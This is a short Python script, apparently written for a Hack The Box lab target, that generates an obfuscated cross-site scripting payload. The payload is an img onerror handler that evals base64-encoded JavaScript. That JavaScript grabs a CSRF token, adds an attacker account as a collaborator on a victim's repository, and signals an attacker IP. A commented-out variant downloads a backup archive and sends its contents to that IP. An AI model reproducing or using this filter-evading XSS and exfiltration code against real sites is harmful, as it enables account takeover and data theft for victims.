#!/usr/bin/env python3

import base64

js = """var u='http://dev.snippet.htb/charlie/backups/settings/collaboration';fetch(u).then(r => document.querySelector('meta[name="_csrf"]').content).then(t => fetch(u,{method:'POST',headers: {'Content-Type':'application/x-www-form-urlencoded;'}, body:'collaborator=konafa&_csrf='+t}).then(d => fetch('http://10.10.16.27/?done')))"""
# js = 'fetch("http://dev.snippet.htb/api/v1/repos/charlie/backups/raw/backup.tar.gz").then(r => r.text()).then(d => fetch("http://10.10.16.27/" + d)).catch(e => fetch("http://10.10.16.27/" + btoa(e)))'
js += '\n'


payload = base64.b64encode(js.encode()).decode()
full_payload = f'test<test><img SRC="x" onerror=eval.call`${{"eval\\x28atob`{payload}`\\x29"}}`>'

print(full_payload)
print(f"Length: {len(full_payload)}")